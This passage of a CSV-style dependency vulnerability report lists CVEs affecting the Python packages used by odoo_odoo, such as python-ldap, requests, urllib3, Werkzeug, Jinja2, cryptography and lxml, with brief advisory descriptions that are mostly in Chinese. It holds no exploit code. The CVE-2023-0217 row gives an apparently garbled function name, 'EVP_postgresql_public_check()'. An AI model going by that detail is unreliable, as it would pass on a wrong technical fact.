python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.dn.escape_dn_chars函数对x00转义不正确，可能导致客户端拒绝服务。",3,2
odoo_odoo,python-ldap,3.4.0,True,CVE-2025-61911,CWE-75 CWE-843,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.filter.escape_filter_chars方法在escape_mode=1模式下未正确处理list或dict类型的assertion_value参数，可能导致LDAP注入攻击。",3,2
odoo_odoo,python-ldap,3.4.4,True,CVE-2025-61912,CWE-116 CWE-170,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.dn.escape_dn_chars函数对x00转义不正确，可能导致客户端拒绝服务。",3,2
odoo_odoo,python-ldap,3.4.4,True,CVE-2025-61911,CWE-75 CWE-843,2025-10-10,"python-ldap是python基金会的一个用于 Python 的 LDAP 客户端 API。
python-ldap 3.4.5之前版本存在安全漏洞，该漏洞源于ldap.filter.escape_filter_chars方法在escape_mode=1模式下未正确处理list或dict类型的assertion_value参数，可能导致LDAP注入攻击。",3,2
odoo_odoo,reportlab,3.6.8,True,CVE-2023-33733,CWE-94,2023-05-31,"ReportLab是丹麦ReportLab公司的一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。
Reportlab v3.6.12及之前版本存在安全漏洞，该漏洞源于允许攻击者通过提供精心制作的PDF文件来执行任意代码。",2,2
odoo_odoo,reportlab,3.6.12,True,CVE-2023-33733,CWE-94,2023-05-31,"ReportLab是丹麦ReportLab公司的一款用于创建数据驱动的PDF文档和自定义矢量图形的开源引擎。
Reportlab v3.6.12及之前版本存在安全漏洞，该漏洞源于允许攻击者通过提供精心制作的PDF文件来执行任意代码。",2,2
odoo_odoo,requests,2.25.1,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
odoo_odoo,requests,2.25.1,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
odoo_odoo,requests,2.25.1,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
odoo_odoo,requests,2.31.0,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
odoo_odoo,requests,2.31.0,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
odoo_odoo,requests,2.31.0,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
odoo_odoo,urllib3,1.26.5,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
odoo_odoo,urllib3,1.26.5,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
odoo_odoo,urllib3,1.26.5,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
odoo_odoo,urllib3,1.26.5,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
odoo_odoo,urllib3,2.0.7,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
odoo_odoo,urllib3,2.0.7,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
odoo_odoo,Werkzeug,2.0.2,True,CVE-2023-25577,CWE-770,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于Werkzeug multipart表单数据解析器可以解析无限数量的文件、字节部分，但每个部分都需要 CPU 时间来解析，并且可能会使用更多内存，如果向 `request.data`、`request.form`、`request.files` 或 `request.get_data(parse_form_data=False)` 的端点发出请求，则可能会导致意外的高资源使用率，攻击者利用该漏洞可以导致拒绝服务。",2,2
odoo_odoo,Werkzeug,2.0.2,True,CVE-2023-23934,CWE-20,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于浏览器可能允许看起来像“=value”而不是“key=value”的“无名”cookie。",4,0
odoo_odoo,Werkzeug,2.0.2,True,CVE-2022-29361,CWE-444,2022-05-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.1.0版本及之前版本存在环境问题漏洞，该漏洞源于不正确解析 HTTP 的请求。攻击者利用该漏洞通过特制的 HTTP 请求执行 HTTP 请求走私。",1,1
odoo_odoo,Werkzeug,2.0.2,True,CVE-2023-46136,CWE-400 CWE-407 CWE-787,2023-10-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 3.0.1之前版本存在安全漏洞，该漏洞源于允许攻击者通过将精心设计的多部分数据发送导致拒绝服务。",2,0
odoo_odoo,Werkzeug,2.0.2,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to slow multipart parsing for large parts.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `werkzeug` to version 3.0.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1)
",2,2
odoo_odoo,Werkzeug,2.0.2,True,CVE-2024-34069,CWE-352,2024-05-06,"Werkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3.",2,0
odoo_odoo,Werkzeug,2.0.2,True,CVE-2024-49766,CWE-22,2024-10-25,Werkzeug 是 Pallets 开发的一个开源全面的WSGI Web应用程序库。在Werkzeug 3.0.6之前的版本中，存在一个路径遍历漏洞。该漏洞的根本原因是，当在Windows系统上且Python版本小于3.11时，os.path.isabs函数无法正确检测UNC路径。这可能导致Werkzeug的safe_join函数生成不安全的路径，从而允许潜在的非预期数据访问。,3,2
odoo_odoo,Werkzeug,2.0.2,True,CVE-2024-49767,CWE-400 CWE-770,2024-10-25,Werkzeug 是一个由 Pallets 开源的全面的 WSGI web 应用程序库，旨在为开发人员提供简单、灵活的工具来搭建 Web 应用程序。在 Werkzeug 3.0.6 之前的版本中，当解析 multipart/form-data 请求时存在拒绝服务漏洞。攻击者可以通过构建特制的请求来耗尽服务器资源，从而导致服务无法响应。,3,2
odoo_odoo,Werkzeug,2.2.2,True,CVE-2023-25577,CWE-770,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于Werkzeug multipart表单数据解析器可以解析无限数量的文件、字节部分，但每个部分都需要 CPU 时间来解析，并且可能会使用更多内存，如果向 `request.data`、`request.form`、`request.files` 或 `request.get_data(parse_form_data=False)` 的端点发出请求，则可能会导致意外的高资源使用率，攻击者利用该漏洞可以导致拒绝服务。",2,2
odoo_odoo,Werkzeug,2.2.2,True,CVE-2023-23934,CWE-20,2023-02-14,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 2.2.3之前版本存在安全漏洞，该漏洞源于浏览器可能允许看起来像“=value”而不是“key=value”的“无名”cookie。",4,0
odoo_odoo,Werkzeug,2.2.2,True,CVE-2023-46136,CWE-400 CWE-407 CWE-787,2023-10-24,"Pallets Werkzeug是一款WSGI Web应用程序库。
Pallets Werkzeug 3.0.1之前版本存在安全漏洞，该漏洞源于允许攻击者通过将精心设计的多部分数据发送导致拒绝服务。",2,0
odoo_odoo,Werkzeug,2.2.2,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to slow multipart parsing for large parts.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `werkzeug` to version 3.0.1 or higher.
## References
- [GitHub Commit](https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1)
",2,2
odoo_odoo,Werkzeug,2.2.2,True,CVE-2024-34069,CWE-352,2024-05-06,"Werkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3.",2,0
odoo_odoo,Werkzeug,2.2.2,True,CVE-2024-49766,CWE-22,2024-10-25,Werkzeug 是 Pallets 开发的一个开源全面的WSGI Web应用程序库。在Werkzeug 3.0.6之前的版本中，存在一个路径遍历漏洞。该漏洞的根本原因是，当在Windows系统上且Python版本小于3.11时，os.path.isabs函数无法正确检测UNC路径。这可能导致Werkzeug的safe_join函数生成不安全的路径，从而允许潜在的非预期数据访问。,3,2
odoo_odoo,Werkzeug,2.2.2,True,CVE-2024-49767,CWE-400 CWE-770,2024-10-25,Werkzeug 是一个由 Pallets 开源的全面的 WSGI web 应用程序库，旨在为开发人员提供简单、灵活的工具来搭建 Web 应用程序。在 Werkzeug 3.0.6 之前的版本中，当解析 multipart/form-data 请求时存在拒绝服务漏洞。攻击者可以通过构建特制的请求来耗尽服务器资源，从而导致服务无法响应。,3,2
odoo_odoo,Werkzeug,3.0.1,True,CVE-2024-34069,CWE-352,2024-05-06,"Werkzeug is a comprehensive WSGI web application library. The debugger in affected versions of Werkzeug can allow an attacker to execute code on a developer's machine under some circumstances. This requires the attacker to get the developer to interact with a domain and subdomain they control, and enter the debugger PIN, but if they are successful it allows access to the debugger even if it is only running on localhost. This also requires the attacker to guess a URL in the developer's application that will trigger the debugger. This vulnerability is fixed in 3.0.3.",2,0
odoo_odoo,Werkzeug,3.0.1,True,CVE-2024-49766,CWE-22,2024-10-25,Werkzeug 是 Pallets 开发的一个开源全面的WSGI Web应用程序库。在Werkzeug 3.0.6之前的版本中，存在一个路径遍历漏洞。该漏洞的根本原因是，当在Windows系统上且Python版本小于3.11时，os.path.isabs函数无法正确检测UNC路径。这可能导致Werkzeug的safe_join函数生成不安全的路径，从而允许潜在的非预期数据访问。,3,2
odoo_odoo,Werkzeug,3.0.1,True,CVE-2024-49767,CWE-400 CWE-770,2024-10-25,Werkzeug 是一个由 Pallets 开源的全面的 WSGI web 应用程序库，旨在为开发人员提供简单、灵活的工具来搭建 Web 应用程序。在 Werkzeug 3.0.6 之前的版本中，当解析 multipart/form-data 请求时存在拒绝服务漏洞。攻击者可以通过构建特制的请求来耗尽服务器资源，从而导致服务无法响应。,3,2
odoo_odoo,babel,>=1.0,True,CVE-2021-20095,,2021-04-29,Babel 2.9.0 中的相对路径遍历允许攻击者在磁盘上加载任意语言环境文件并执行任意代码。,3,2
odoo_odoo,babel,>=1.0,True,CVE-2021-42771,CWE-22,2021-05-02,"Babel是一款使用在内容管理系统中的多语言支持模块。
Babel存在安全漏洞，该漏洞源于外部输入数据构造操作系统可执行命令过程中，网络系统或产品未正确过滤其中的特殊字符、命令等。攻击者可利用该漏洞执行非法操作系统命令。",2,0
odoo_odoo,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
odoo_odoo,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
odoo_odoo,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
odoo_odoo,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
odoo_odoo,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
odoo_odoo,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
odoo_odoo,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
odoo_odoo,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
odoo_odoo,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
odoo_odoo,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
odoo_odoo,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
odoo_odoo,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
odoo_odoo,gevent,,True,,CWE-200,2017-12-04,"## Overview
Affected versions of [`gevent`](https://pypi.python.org/pypi/gevent) are vulnerable to Information Exposure.

The pywsgi `environ` dict print the entire WSGI environment by default which could have lead to information Exposure.

## Remediation
Upgrade `gevent` to version 1.2a1 or higher.

## References
- [GitHub Changelog](https://github.com/gevent/gevent/blob/master/CHANGES.rst#security)
- [Github PR #1](https://github.com/gevent/gevent/pull/779)
- [Github PR #2](https://github.com/gevent/gevent/pull/781)
- [Github Commit](https://github.com/gevent/gevent/commit/4fe26b0d47568744b101a56b475b226efae08b1f)
",3,2
odoo_odoo,gevent,,True,CVE-2023-41419,CWE-444,2023-09-20,"gevent是gevent开源的一个 Python 库。
Gevent 23.9.1之前版本存在安全漏洞。远程攻击者利用该漏洞通过特制的脚本将权限升级。",1,2
odoo_odoo,idna,,True,CVE-2024-3651,CWE-1333,,idna 是一个用于国际化域名 (IDNA) 协议的库。此库在处理 `idna.encode` 函数时存在资源消耗漏洞。攻击者可以通过提供特制的输入，消耗大量资源，并可能导致拒绝服务 (DoS)。该漏洞是通过输入异常大的字符串触发，这种情况在正常使用中不会发生，但可能由于缺乏前置输入验证而被高级应用程序传递给库。,3,1
odoo_odoo,Jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
odoo_odoo,Jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
odoo_odoo,Jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
odoo_odoo,Jinja2,,True,CVE-2019-10906,CWE-693,2019-04-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 2.10.1之前版本中存在权限许可和访问控制问题漏洞。攻击者可利用该漏洞绕过沙盒保护。",2,2
odoo_odoo,Jinja2,,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
odoo_odoo,Jinja2,,True,CVE-2014-1402,CWE-264,2014-01-10,"Jinja2是一个基于Python的模板引擎，它拥有完整的unicode支持，并且提供了可选的沙箱模板执行环境来保证安全。
Jinja2 2.7.1及之前版本的bccache.FileSystemBytecodeCache中的默认配置存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可借助/tmp目录下特制的cache文件利用该漏洞获取特权。",2,0
odoo_odoo,Jinja2,,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
odoo_odoo,Jinja2,,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
odoo_odoo,Jinja2,,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
odoo_odoo,Jinja2,,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
odoo_odoo,lxml,,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
odoo_odoo,lxml,,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
odoo_odoo,lxml,,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
odoo_odoo,lxml,,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
odoo_odoo,lxml,,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
odoo_odoo,lxml,,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
odoo_odoo,lxml,,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
odoo_odoo,lxml,,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

